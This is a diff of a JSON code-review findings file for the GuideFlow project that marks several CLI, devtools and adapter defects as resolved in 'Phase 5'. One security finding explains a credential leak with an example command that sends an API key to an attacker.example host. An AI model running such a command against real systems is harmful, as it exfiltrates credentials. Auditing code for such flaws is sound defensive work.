       "file": "packages/cli/src/commands/init.ts",
       "line": 95,
@@ -1236,7 +1249,8 @@
       "impact": "`existsSync` is imported (line 1) and used for the directory (line 91) but never for the files. Re-running `guideflow init` — or running it in a directory that happens to contain a `guideflow.ts` — silently destroys the user's customised configuration and tour, then prints `✓ GuideFlow initialized!`. This is the documented workflow for \"an existing project\" (apps/docs/api/cli.md:24 \"Scaffolds GuideFlow configuration files into an existing project\"), so accidental re-runs are likely, and there is no dry-run flag to check first.",
       "fix": "Guard each write: if the target exists, skip it and report `- skipped guideflow.ts (already exists)`, or prompt via the inquirer instance already imported. Add `--force` to opt into overwriting and `--dry-run` to preview. Track which files were actually written so the summary at lines 103-108 does not claim files it skipped.",
       "effort": "S",
-      "verifierNote": "init.ts:95-100 verbatim. existsSync is imported at line 1 and used only at line 91 for the directory; the three writeFileSync calls have no existence check, no prompt, no --force/--dry-run, and line 102 prints `✓ GuideFlow initialized!` regardless. apps/docs/api/cli.md:24 does say 'Scaffolds GuideFlow configuration files into an existing project', so re-running against a populated directory is the documented use."
+      "verifierNote": "init.ts:95-100 verbatim. existsSync is imported at line 1 and used only at line 91 for the directory; the three writeFileSync calls have no existence check, no prompt, no --force/--dry-run, and line 102 prints `✓ GuideFlow initialized!` regardless. apps/docs/api/cli.md:24 does say 'Scaffolds GuideFlow configuration files into an existing project', so re-running against a populated directory is the documented use.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "init-vue-svelte-scaffold-nothing",
@@ -1244,7 +1258,7 @@
       "severity": "P1",
       "kind": "missing-implementation",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "`init --framework vue` / `svelte` silently scaffolds no framework code and reports success",
       "file": "packages/cli/src/commands/init.ts",
       "line": 98,
@@ -1252,7 +1266,8 @@
       "impact": "The prompt at lines 74-79 offers `['react', 'vue', 'svelte', 'none']` and the `--framework` help at line 67 advertises `react | vue | svelte | none`, but only `REACT_TEMPLATE` exists in the file (there is no VUE_TEMPLATE or SVELTE_TEMPLATE). A Vue user selecting `vue` gets exactly the same two files as `none`, plus a success banner and `pnpm add @guideflow/core @guideflow/vue` (line 112) — with no wrapper, no plugin registration, and no hint that anything is missing. `packages/vue/src/plugin.ts` and `packages/svelte/src/index.ts` both exist, so the adapters are real; only the scaffolding is absent. `--framework` is also never validated: `guideflow init --framework angular` is accepted, skips the prompt (line 78 `when: !opts.framework`), and prints `pnpm add @guideflow/core @guideflow/angular` for a package that does not exist.",
       "fix": "Add VUE_TEMPLATE (using the `app.use(...)` plugin from packages/vue/src/plugin.ts) and SVELTE_TEMPLATE, and dispatch on `framework` with a `default:` branch. Validate the flag against the allowed set at the top of the action and exit with a clear error otherwise (Commander's `.choices([...])` on the option does this declaratively).",
       "effort": "M",
-      "verifierNote": "Read the whole of init.ts: the only templates are CORE_TEMPLATE (8), REACT_TEMPLATE (16) and FLOW_TEMPLATE (25) — there is no VUE_TEMPLATE or SVELTE_TEMPLATE, and line 98's `if (framework === 'react')` is the only framework branch. Choices ['react','vue','svelte','none'] at line 76 and the --framework help at line 67 verified. `framework` is never validated, and `when: !opts.framework` (line 78) means `--framework angular` skips the prompt and reaches line 112's `pnpm add @guideflow/core @guideflow/angular`. packages/vue/src/plugin.ts and packages/svelte/src/index.ts both exist, so the adapters are real and only the scaffolding is missing."
+      "verifierNote": "Read the whole of init.ts: the only templates are CORE_TEMPLATE (8), REACT_TEMPLATE (16) and FLOW_TEMPLATE (25) — there is no VUE_TEMPLATE or SVELTE_TEMPLATE, and line 98's `if (framework === 'react')` is the only framework branch. Choices ['react','vue','svelte','none'] at line 76 and the --framework help at line 67 verified. `framework` is never validated, and `when: !opts.framework` (line 78) means `--framework angular` skips the prompt and reaches line 112's `pnpm add @guideflow/core @guideflow/angular`. packages/vue/src/plugin.ts and packages/svelte/src/index.ts both exist, so the adapters are real and only the scaffolding is missing.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "push-hardcoded-nonexistent-saas",
@@ -1277,7 +1292,7 @@
       "severity": "P1",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "`--api-key` is a requiredOption, making the documented GUIDEFLOW_API_KEY env-var path unreachable dead code",
       "file": "packages/cli/src/commands/push.ts",
       "line": 24,
@@ -1285,7 +1300,8 @@
       "impact": "Commander aborts with `error: required option '-k, --api-key <key>' not specified` and exit code 1 *before* the action handler runs. Therefore push.ts:35 `const apiKey: string = opts.apiKey || process.env['GUIDEFLOW_API_KEY'] || '';` can never see an empty `opts.apiKey`, and the guard at lines 36-39 (`Error: API key is required. Pass --api-key or set GUIDEFLOW_API_KEY.`) is unreachable. Concretely: `GUIDEFLOW_API_KEY=sk_live_x guideflow push my-tour.flow.json` fails outright, despite the option's own help text promising it works. This is the standard CI setup (secret in env, not on the command line), so the only usable path forces the key onto argv — where it lands in shell history and is visible to any process reading `/proc/<pid>/cmdline` or `ps`.",
       "fix": "Change push.ts:24 to `.option('-k, --api-key <key>', 'API key (or set GUIDEFLOW_API_KEY env var)')` — Commander's `.env()` (v12: `.option(...).env('GUIDEFLOW_API_KEY')`) does this natively — and keep the runtime guard at lines 36-39 as the real enforcement point.",
       "effort": "S",
-      "verifierNote": "push.ts:24 is verbatim `.requiredOption('-k, --api-key <key>', 'API key (or set GUIDEFLOW_API_KEY env var)')`. Commander runs _checkForMissingMandatoryOptions inside _parseCommand before the action handler and calls this.error(), so lines 35-39 (`opts.apiKey || process.env['GUIDEFLOW_API_KEY']` and the 'API key is required' guard) are unreachable dead code — the option's own help text advertises a path it forbids. The repo already knows this: .claude/agents/gf-docs-truth-checker.md:65 records the same contradiction. Downgrading from P0: the documented primary path (`--api-key`) works, so `push` is not shipped-broken outright; what is broken is the env-var/CI path plus the secret-on-argv consequence — a serious defect, not a total break."
+      "verifierNote": "push.ts:24 is verbatim `.requiredOption('-k, --api-key <key>', 'API key (or set GUIDEFLOW_API_KEY env var)')`. Commander runs _checkForMissingMandatoryOptions inside _parseCommand before the action handler and calls this.error(), so lines 35-39 (`opts.apiKey || process.env['GUIDEFLOW_API_KEY']` and the 'API key is required' guard) are unreachable dead code — the option's own help text advertises a path it forbids. The repo already knows this: .claude/agents/gf-docs-truth-checker.md:65 records the same contradiction. Downgrading from P0: the documented primary path (`--api-key`) works, so `push` is not shipped-broken outright; what is broken is the env-var/CI path plus the secret-on-argv consequence — a serious defect, not a total break.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "attribute-tour-one-step-per-state",
@@ -1563,7 +1579,7 @@
       "severity": "P1",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "GF_FLOWS_LIST postMessages raw FlowDefinitions containing functions — silently swallowed on one path, uncaught throw on the other",
       "file": "packages/devtools/src/bridge.ts",
       "line": 94,
@@ -1571,7 +1587,8 @@
       "impact": "`FlowDefinition.states[*]` carries `onEntry?: (context) => void` and `onExit?: (context) => void` (packages/core/src/types/index.ts:97-99); `Step.content` may be `() => MaybePromise<StepContent>`, `Step.showIf` is a function, `Step.target` may be an `HTMLElement`, and transitions may carry a `guard` function (types/index.ts:57-60, 76-78). None of these survive structured clone, so `postMessage` throws `DataCloneError` for any non-trivial flow. Here the catch swallows it and the Flows tab silently shows \"No flows registered on this page\" — a lie. On the other path, `case 'GF_LIST_FLOWS'` at bridge.ts:142-148 has no try/catch at all, so the popup's Refresh button and the panel's list-flows command throw an uncaught error into the host page's console. Either way the Flows tab is empty for exactly the flows worth inspecting.",
       "fix": "Serialize flows through a sanitizer before posting: `JSON.parse(JSON.stringify(flows, (k, v) => typeof v === 'function' ? `[fn ${k}]` : v instanceof Element ? `[Element ${v.tagName}]` : v))`. Wrap the `GF_LIST_FLOWS` post in try/catch and post a `GF_FLOWS_ERROR` on failure so the panel can render a real error state instead of an empty list.",
       "effort": null,
-      "verifierNote": "bridge.ts:93-103 verbatim with the postMessage inside the try/catch; bridge.ts:142-149 (GF_LIST_FLOWS) has no try/catch. Verified that real in-repo flows carry functions: apps/demo/src/flows/onboarding.ts:131 has `guard: (ctx) => ...` and 134/181 have `onEntry: (ctx) => ...`, and core listFlows (packages/core/src/index.ts:304-306) returns the registered FlowDefinition objects verbatim. Structured clone therefore throws for the demo's own flows — silently on one path, uncaught on the other."
+      "verifierNote": "bridge.ts:93-103 verbatim with the postMessage inside the try/catch; bridge.ts:142-149 (GF_LIST_FLOWS) has no try/catch. Verified that real in-repo flows carry functions: apps/demo/src/flows/onboarding.ts:131 has `guard: (ctx) => ...` and 134/181 have `onEntry: (ctx) => ...`, and core listFlows (packages/core/src/index.ts:304-306) returns the registered FlowDefinition objects verbatim. Structured clone therefore throws for the demo's own flows — silently on one path, uncaught on the other.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "generated-flow-one-step-per-state",
@@ -1675,7 +1692,7 @@
       "severity": "P1",
       "kind": "test-coverage",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "The extension has no tests and no `test` script, so `turbo run test` silently skips it in CI",
       "file": "packages/devtools/package.json",
       "line": 7,
@@ -1683,7 +1700,8 @@
       "impact": "There is no `test` script, no test file anywhere under `packages/devtools/src`, and no Playwright coverage in apps/e2e that loads the unpacked extension (grepping apps/e2e for \"devtools\"/\"extension\" returns nothing). `.github/workflows/ci.yml` runs `pnpm turbo run test`, which finds no `test` task for this package and reports success — so CI is green while every defect in this report ships. Nothing verifies that the build emits the files manifest.json names, that selectors resolve, that the message protocol round-trips, or that the page-world bridge does not crash the host page (the P0 above would have been caught by a single smoke test against apps/demo).",
       "fix": "Add Vitest unit tests for `buildSelector` (uniqueness, nth-child anchoring, shadow DOM) against jsdom fixtures, a build-output assertion test (every path in manifest.json exists in dist, content.js has no top-level import), and a Playwright test in apps/e2e using `chromium.launchPersistentContext` with `--load-extension=packages/devtools/dist` that loads apps/demo, opens a tour, and asserts the tour actually renders with the extension installed.",
       "effort": null,
-      "verifierNote": "package.json:7-13 verbatim — build/dev/type-check/lint/clean, no `test`. No test files exist under packages/devtools (full file listing shows only src, assets, configs), and grep of apps/e2e for extension/devtools returns nothing. .github/workflows/ci.yml:44 runs `pnpm turbo run test --filter=!storybook --filter=!docs --filter=!e2e --filter=!@guideflow/demo`, which finds no test task here and passes."
+      "verifierNote": "package.json:7-13 verbatim — build/dev/type-check/lint/clean, no `test`. No test files exist under packages/devtools (full file listing shows only src, assets, configs), and grep of apps/e2e for extension/devtools returns nothing. .github/workflows/ci.yml:44 runs `pnpm turbo run test --filter=!storybook --filter=!docs --filter=!e2e --filter=!@guideflow/demo`, which finds no test task here and passes.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "ai-generate-options-arg-fabricated",
@@ -2325,7 +2343,7 @@
       "severity": "P1",
       "kind": "security",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "guideflow push forces the API key onto the command line; the documented env-var fallback is unreachable and the endpoint is unvalidated",
       "file": "packages/cli/src/commands/push.ts",
       "line": 24,
@@ -2333,7 +2351,8 @@
       "impact": "Two defects compound. (1) The option is declared with `.requiredOption`, so commander aborts with `error: required option '-k, --api-key <key>' not specified` before the action callback ever runs — which means the `process.env['GUIDEFLOW_API_KEY']` fallback at line 35 (`const apiKey: string = opts.apiKey || process.env['GUIDEFLOW_API_KEY'] || '';`) is dead code and the help text's \"(or set GUIDEFLOW_API_KEY env var)\" is a lie. The only usable invocation is the one the docs print at apps/docs/guide/quick-start.md:95, `npx @guideflow/cli push my-tour.flow.json --api-key YOUR_KEY`, which writes the production secret into shell history and exposes it in `/proc/<pid>/cmdline` and `ps aux` to every local user and to any CI log that echoes the command. (2) `--endpoint` accepts any string with no scheme or host validation and is passed straight to `fetch` at line 53 with the header `'Authorization': 'Bearer ' + apiKey` at line 57, so `guideflow push flow.json -k $KEY -e http://attacker.example/collect` transmits the bearer token in cleartext over plain HTTP to an arbitrary host — a one-character typo or a malicious snippet in a README is enough to leak it.",
       "fix": "Change `.requiredOption('-k, --api-key <key>', ...)` to `.option('-k, --api-key <key>', ...)` so the existing env-var fallback becomes reachable, and make the env var the documented primary path; when `--api-key` is passed on the command line, print a warning that the value is now in shell history. Reject non-HTTPS endpoints unless an explicit `--allow-insecure` flag is present: parse with `new URL(opts.endpoint)` and fail when `u.protocol !== 'https:'`. Update apps/docs/guide/quick-start.md:95 to use the env-var form.",
       "effort": "S",
-      "verifierNote": "push.ts:24-25 is verbatim. Because commander's .requiredOption aborts in parse() before the .action callback, the fallback at line 35 `const apiKey: string = opts.apiKey || process.env['GUIDEFLOW_API_KEY'] || '';` and the guard at 36-39 are unreachable, and the flag's own help text '(or set GUIDEFLOW_API_KEY env var)' is therefore false. The documented invocation at apps/docs/guide/quick-start.md:95 is exactly `npx @guideflow/cli push my-tour.flow.json --api-key YOUR_KEY`, confirmed by reading the file. --endpoint (line 25) takes any string and is passed unvalidated to fetch at line 53 with `'Authorization': \\`Bearer ${apiKey}\\`` at line 57 — no scheme or host check anywhere in the file."
+      "verifierNote": "push.ts:24-25 is verbatim. Because commander's .requiredOption aborts in parse() before the .action callback, the fallback at line 35 `const apiKey: string = opts.apiKey || process.env['GUIDEFLOW_API_KEY'] || '';` and the guard at 36-39 are unreachable, and the flag's own help text '(or set GUIDEFLOW_API_KEY env var)' is therefore false. The documented invocation at apps/docs/guide/quick-start.md:95 is exactly `npx @guideflow/cli push my-tour.flow.json --api-key YOUR_KEY`, confirmed by reading the file. --endpoint (line 25) takes any string and is passed unvalidated to fetch at line 53 with `'Authorization': \\`Bearer ${apiKey}\\`` at line 57 — no scheme or host check anywhere in the file.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "devtools-content-script-relays-any-message-type",
@@ -2519,7 +2538,7 @@
       "severity": "P2",
       "kind": "gap",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "hints, progress, i18n, listFlows, configure, currentStep and currentContent are exposed by no adapter in any framework",
       "file": "packages/svelte/src/index.ts",
       "line": 21,
@@ -2527,7 +2546,8 @@
       "impact": "Core's public surface includes `hints(steps)`, `showHints()`, `hideHints()`, `progress` (ProgressStore), `i18n` (I18nRegistry), `listFlows()`, `createFlow()`, `configure()`, `currentStep` and `currentContent`. Not one of these has a reactive or idiomatic binding in any of the three adapters: `useTour`/`useTour`(Vue)/`TourStore` all expose exactly four scalars and six methods. `currentStep`/`currentContent` in particular are only read inside `<GuidePopover>` (GuidePopover.tsx:57-64) and never returned from `useTour`, so a React user writing a custom popover has to re-subscribe to `step:enter` and read the imperative getters themselves — the very boilerplate the adapter exists to remove. Vue and Svelte users have no popover component and no `currentStep`, so building custom UI in those frameworks means reimplementing the adapter.",
       "fix": "Add `currentStep` and `currentContent` to all three adapters' state (they are already refreshed on the same `step:enter` event that drives the existing scalars — one extra field per adapter). Add `useHints`/`useProgress` React hooks (and Vue/Svelte equivalents) or, at minimum, document explicitly in each guide that these live on the raw instance via `useGuideFlow()`/`store.instance`.",
       "effort": "M",
-      "verifierNote": "The TourStore excerpt (svelte/src/index.ts:21-29) is verbatim. Cross-checked all three adapters: none expose hints/showHints/hideHints/progress/i18n/listFlows/createFlow/configure/currentStep/currentContent reactively. currentStep/currentContent are read only inside GuidePopover.tsx:57-64 as cited and are absent from every useTour return. Downgrading to P2: every adapter does hand back the raw instance (useGuideFlow / plugin useGuideFlow / TourStore.instance at svelte index.ts:105), so this is missing ergonomics, not missing capability — 'exposed by no adapter' is accurate only in the reactive-binding sense the impact paragraph eventually concedes."
+      "verifierNote": "The TourStore excerpt (svelte/src/index.ts:21-29) is verbatim. Cross-checked all three adapters: none expose hints/showHints/hideHints/progress/i18n/listFlows/createFlow/configure/currentStep/currentContent reactively. currentStep/currentContent are read only inside GuidePopover.tsx:57-64 as cited and are absent from every useTour return. Downgrading to P2: every adapter does hand back the raw instance (useGuideFlow / plugin useGuideFlow / TourStore.instance at svelte index.ts:105), so this is missing ergonomics, not missing capability — 'exposed by no adapter' is accurate only in the reactive-binding sense the impact paragraph eventually concedes.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "adapters-no-pause-resume-anywhere",
@@ -2535,7 +2555,7 @@
       "severity": "P2",
       "kind": "gap",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "pause/resume exist on GuideFlowInstance but no adapter surfaces them, and core exposes no isPaused getter to render against",
       "file": "packages/react/src/hooks/use-tour.ts",
       "line": 17,
@@ -2543,7 +2563,8 @@
       "impact": "`GuideFlowInstance` declares `pause(): void` and `resume(): void` (core/src/index.ts:138-140) and emits `tour:pause`/`tour:resume` (types/index.ts:206-207), but none of the three adapters expose them: `UseTourReturn` (above), Vue's `UseTourReturn` (packages/vue/src/composables/use-tour.ts:10-21) and Svelte's `TourStore` (packages/svelte/src/index.ts:21-46) all stop at start/next/prev/goTo/send/stop. Compounding this, `_paused` is a private field on TourEngine (engine/tour.ts:43) with no public getter, so even a hand-rolled adapter cannot render a paused state. The pause feature is therefore unreachable from any framework without dropping to `useGuideFlow()` and cannot be reflected in UI at all. apps/demo/src/App.tsx subscribes to `'tour:pause','tour:resume'` for its event log (line 184) but has no button that can ever fire them — visible dead wiring.",
       "fix": "Add `get isPaused(): boolean` to TourEngine and to the `GuideFlowInstance` interface, then add `pause`/`resume`/`isPaused` to all three adapters' return shapes (React state object, Vue readonly ref, Svelte readable) and subscribe them to `tour:pause`/`tour:resume`. Add pause/resume buttons to apps/demo so the path is exercised.",
       "effort": "M",
-      "verifierNote": "UseTourReturn (use-tour.ts:17-24) is quoted verbatim and stops at stop(). Vue's UseTourReturn (use-tour.ts:10-21) and Svelte's TourStore (index.ts:21-46) likewise. GuideFlowInstance declares pause()/resume() at core/src/index.ts:138-140 and the events at types/index.ts:206-207 — both line references exact. `grep -n \"isPaused|get paused\"` over engine/tour.ts and index.ts returns nothing, so _paused (tour.ts:43) really has no public getter. apps/demo/src/App.tsx:184 subscribes to tour:pause/tour:resume and `grep \"\\.pause|\\.resume\"` finds no caller — dead wiring confirmed. Downgrading to P2: an escape hatch exists (useGuideFlow().pause()), so this is a notable adapter-surface gap rather than a serious defect; the un-renderable paused state is the genuinely unfixable part."
+      "verifierNote": "UseTourReturn (use-tour.ts:17-24) is quoted verbatim and stops at stop(). Vue's UseTourReturn (use-tour.ts:10-21) and Svelte's TourStore (index.ts:21-46) likewise. GuideFlowInstance declares pause()/resume() at core/src/index.ts:138-140 and the events at types/index.ts:206-207 — both line references exact. `grep -n \"isPaused|get paused\"` over engine/tour.ts and index.ts returns nothing, so _paused (tour.ts:43) really has no public getter. apps/demo/src/App.tsx:184 subscribes to tour:pause/tour:resume and `grep \"\\.pause|\\.resume\"` finds no caller — dead wiring confirmed. Downgrading to P2: an escape hatch exists (useGuideFlow().pause()), so this is a notable adapter-surface gap rather than a serious defect; the un-renderable paused state is the genuinely unfixable part.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "cli-init-vue-svelte-scaffolds-nothing",
@@ -2567,7 +2588,7 @@
       "severity": "P2",
       "kind": "bug",
       "verdict": "PLAUSIBLE",
-      "status": "open",
+      "status": "resolved",
       "title": "ConversationalPanel cannot abort in-flight AI requests, swallows the error object entirely, and stores highlights it never renders",
       "file": "packages/react/src/components/ConversationalPanel.tsx",
       "line": 88,
@@ -2575,7 +2596,8 @@
       "impact": "Four defects in one component. (1) No abort: `await aiProp.chat(question)` (line 70) has no AbortSignal — and `GuideBrain.chat(question, root?)` (packages/ai/src/brain.ts:244) accepts none — so closing the panel or unmounting leaves an LLM request running, and its `setMessages` resolves into a discarded component; a user who asks three questions quickly gets three responses appended in nondeterministic completion order. (2) `err` is captured and never logged or surfaced, so a 401 from OpenAI, a CORS failure and a JSON parse error are indistinguishable — the developer sees only \"Something went wrong\" with no console trace. (3) `highlights` is written onto the message at line 73 (`highlights: answer.highlights ?? []`) and declared on the `Message` type (line 13), but the render loop at lines 136-152 only reads `msg.content` — the field is dead. (4) The comment `// Spotlight highlighted elements` at line 75 is false: the code only calls `el.scrollIntoView` in a `forEach`, so with multiple highlights every scroll but the last is immediately overridden, and the core `SpotlightOverlay` is never used.",
       "fix": "Add an `AbortSignal` parameter to `GuideBrain.chat()` and thread it from an `AbortController` held in a ref, aborting in an unmount cleanup and before each new submit. Log `err` via console.error (or an `onError` prop) alongside the friendly message. Render `msg.highlights` as clickable chips, and replace the scrollIntoView loop with a real `gf` spotlight call on the first highlight.",
       "effort": "M",
-      "verifierNote": "Sub-claims (2), (3) and (4) are confirmed verbatim: `catch (err)` at line 88 never touches err; `highlights` is written at line 73 and declared at line 13 but the render loop at 136-152 reads only msg.content; the comment at line 75 precedes a forEach of scrollIntoView with no SpotlightOverlay involvement. Sub-claim (1) is partly refuted — the concrete impact given ('three questions quickly … nondeterministic completion order') cannot occur, because handleSubmit early-returns on `if (!question || loading) return` (line 58) and the input and submit button are both `disabled={loading}` (lines 168, 184), so only one request can be in flight. The unmount case remains, but a stale setMessages is a no-op in React 18+. GuideBrain.chat(question, root?) at packages/ai/src/brain.ts:244 does confirm no AbortSignal. Downgrading to P2 given one of the four sub-claims does not reproduce."
+      "verifierNote": "Sub-claims (2), (3) and (4) are confirmed verbatim: `catch (err)` at line 88 never touches err; `highlights` is written at line 73 and declared at line 13 but the render loop at 136-152 reads only msg.content; the comment at line 75 precedes a forEach of scrollIntoView with no SpotlightOverlay involvement. Sub-claim (1) is partly refuted — the concrete impact given ('three questions quickly … nondeterministic completion order') cannot occur, because handleSubmit early-returns on `if (!question || loading) return` (line 58) and the input and submit button are both `disabled={loading}` (lines 168, 184), so only one request can be in flight. The unmount case remains, but a stale setMessages is a no-op in React 18+. GuideBrain.chat(question, root?) at packages/ai/src/brain.ts:244 does confirm no AbortSignal. Downgrading to P2 given one of the four sub-claims does not reproduce.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "demo-dead-push-ui-and-false-transport-count",
@@ -2615,7 +2637,7 @@
       "severity": "P2",
       "kind": "bug",
       "verdict": "PLAUSIBLE",
-      "status": "open",
+      "status": "resolved",
       "title": "All React subscriptions read mutable engine state during render with plain useState — no useSyncExternalStore, so concurrent rendering can tear",
       "file": "packages/react/src/hooks/use-tour.ts",
       "line": 41,
@@ -2623,7 +2645,8 @@
       "impact": "Three problems that `useSyncExternalStore` (available since React 18, and the peer range's floor is React 17 only because of the untested claim above) exists precisely to solve. (1) The initial value is read from the mutable engine *during render*; under React 18/19 concurrent rendering an interrupted-and-resumed render tree can commit components that read different engine states, so two `useTour()` consumers can display different step numbers for the same step. (2) The subscription is installed in a passive `useEffect`, so any `step:enter` that fires between render and effect-flush is missed and the component shows stale state until the next event. (3) `setState` always allocates a fresh object literal, so there is no bail-out: every one of the five subscribed events re-renders every `useTour()` consumer, and since core emits `step:exit` then `step:enter` per navigation that is two full re-render passes per step for every call site. `GuidePopover`, `<TourStep>` and `useTourStep` share pattern (1) and (2).",
       "fix": "Rewrite `useTour` on `useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot)` with a memoised snapshot (cache the object and return the previous reference when all four scalars are unchanged) so React can bail out. Export the subscribe/getSnapshot pair from the package so `useTourStep`, `TourStep` and `GuidePopover` can share it.",
       "effort": "M",
-      "verifierNote": "use-tour.ts:41-46 is verbatim, the subscription is installed in a passive useEffect at 48-69, and setState always builds a fresh object literal — so sub-claim (3), two full re-render passes per navigation for every consumer, is straightforwardly true, and the pattern is repeated in GuidePopover/TourStep/useTourStep as claimed. Sub-claims (1) and (2) are real hazards but unproven here: tearing requires concurrent features the library never triggers itself, and the render-to-effect gap needs an event emitted between a consumer's render and its effect flush, which nothing in the codebase does. useSyncExternalStore is the right fix, but the headline 'concurrent rendering can tear' is speculative. Downgrading to P2."
+      "verifierNote": "use-tour.ts:41-46 is verbatim, the subscription is installed in a passive useEffect at 48-69, and setState always builds a fresh object literal — so sub-claim (3), two full re-render passes per navigation for every consumer, is straightforwardly true, and the pattern is repeated in GuidePopover/TourStep/useTourStep as claimed. Sub-claims (1) and (2) are real hazards but unproven here: tearing requires concurrent features the library never triggers itself, and the render-to-effect gap needs an event emitted between a consumer's render and its effect flush, which nothing in the codebase does. useSyncExternalStore is the right fix, but the headline 'concurrent rendering can tear' is speculative. Downgrading to P2.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "react-provider-ignores-config-changes",
@@ -2631,7 +2654,7 @@
       "severity": "P2",
       "kind": "bug",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "TourProvider snapshots `config` into a ref on first render and never applies later changes",
       "file": "packages/react/src/context.tsx",
       "line": 28,
@@ -2639,7 +2662,8 @@
       "impact": "`configRef` is initialised once and never updated, and `gf.configure()` is never called. A component that renders `<TourProvider config={{ debug: isDev, nonce: cspNonce, context: { userId } }}>` and later changes any of it — the overwhelmingly common case for `context.userId` after auth resolves — silently keeps the first value forever. Because `context.userId` is what core uses to gate persistence (`const userId = _config.context?.userId` in core/src/index.ts:243 and :323), a provider mounted before login permanently disables progress persistence and completion tracking with no warning. The prop's existence strongly implies it is live.",
       "fix": "Add `useEffect(() => { if (!instance && config) gf.configure(config) }, [gf, instance, config])`, and document in TourProviderProps that `config` is applied via `configure()` on change (or, if the snapshot behaviour is intentional, rename the prop to `initialConfig` and say so in the JSDoc and in apps/docs/api/react/tour-provider.md).",
       "effort": "S",
-      "verifierNote": "context.tsx:28 `const configRef = useRef(config)` is verbatim, there is no effect updating configRef.current, and `configure` is never called anywhere in packages/react/src. The persistence gating is exactly as cited: core/src/index.ts:243 `const userId = _config.context?.userId` in start() and :323 the same in _saveProgress(), both reading the closure config that only configure() mutates. Downgrading to P2: init-only provider config is a common (if undocumented) library convention, and the documented primary path in the README and docs is `<TourProvider instance={gf}>`, where the user holds the instance and can call gf.configure() — so this is a notable undocumented gap rather than a serious defect."
+      "verifierNote": "context.tsx:28 `const configRef = useRef(config)` is verbatim, there is no effect updating configRef.current, and `configure` is never called anywhere in packages/react/src. The persistence gating is exactly as cited: core/src/index.ts:243 `const userId = _config.context?.userId` in start() and :323 the same in _saveProgress(), both reading the closure config that only configure() mutates. Downgrading to P2: init-only provider config is a common (if undocumented) library convention, and the documented primary path in the README and docs is `<TourProvider instance={gf}>`, where the user holds the instance and can call gf.configure() — so this is a notable undocumented gap rather than a serious defect.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "react-provider-usememo-not-a-cache-guarantee",
@@ -2647,7 +2671,7 @@
       "severity": "P2",
       "kind": "bug",
       "verdict": "PLAUSIBLE",
-      "status": "open",
+      "status": "resolved",
       "title": "TourProvider constructs the stateful engine inside useMemo, which React is documented to be allowed to discard",
       "file": "packages/react/src/context.tsx",
       "line": 29,
@@ -2655,7 +2679,8 @@
       "impact": "`useMemo` is a performance hint, not a semantic guarantee — React may throw away the cached value and re-run the factory (this already happens on every render under React 18/19 StrictMode dev double-invocation, producing a second `createGuideFlow()` whose `HotspotManager`, `HintSystem`, `ProgressStore` and `DefaultRenderer` are silently discarded without `destroy()`). If React drops the memo in production, a brand-new instance is handed to the context: every `useTour`/`useTourStep`/`GuidePopover` subscription re-binds to the fresh instance in its `[gf]`-keyed effect while the in-flight tour continues running on the abandoned one, so the UI freezes on the old step with no events arriving and no error. Because `<TourProvider config={...}>` is the documented no-instance path (JSDoc lines 20-25), this is the default for new users.",
       "fix": "Replace `useMemo` with a lazy `useState` initializer (`const [gf] = useState(() => instance ?? createGuideFlow(configRef.current ?? {}))`) — state is a semantic guarantee — plus the destroy effect above. Guard against the StrictMode double-create by destroying the loser in the effect.",
       "effort": "S",
-      "verifierNote": "The code is quoted verbatim (context.tsx:29-32) and useMemo is genuinely the wrong primitive for constructing a stateful singleton. But the stated production impact is unproven: React 18/19 do not discard useMemo values for a mounted component with unchanged deps, so the 'brand-new instance handed to context while the tour runs on the abandoned one' scenario is theoretical. The reproducible part is StrictMode dev double-invocation creating one extra createGuideFlow() that is dropped without destroy() — and even that is near-harmless, since a fresh instance attaches no document listeners until start() and injectStyles is id-idempotent. Downgrading to P2: correct-by-accident code hygiene, not a shipped defect."
+      "verifierNote": "The code is quoted verbatim (context.tsx:29-32) and useMemo is genuinely the wrong primitive for constructing a stateful singleton. But the stated production impact is unproven: React 18/19 do not discard useMemo values for a mounted component with unchanged deps, so the 'brand-new instance handed to context while the tour runs on the abandoned one' scenario is theoretical. The reproducible part is StrictMode dev double-invocation creating one extra createGuideFlow() that is dropped without destroy() — and even that is near-harmless, since a fresh instance attaches no document listeners until start() and injectStyles is id-idempotent. Downgrading to P2: correct-by-accident code hygiene, not a shipped defect.",
+      "resolvedIn": "Phase 5"
     },
     {
       "id": "react-tests-mock-only-half-the-surface-untested",
@@ -2663,7 +2688,7 @@
       "severity": "P2",
       "kind": "test-coverage",
       "verdict": "CONFIRMED",
-      "status": "open",
+      "status": "resolved",
       "title": "React tests cover 4 of 9 exports and only against a hand-written mock; GuidePopover, HotspotBeacon, ConversationalPanel and useHotspot have zero tests",
       "file": "packages/react/src/__tests__/react.test.tsx",
       "line": 16,
@@ -2671,7 +2696,8 @@
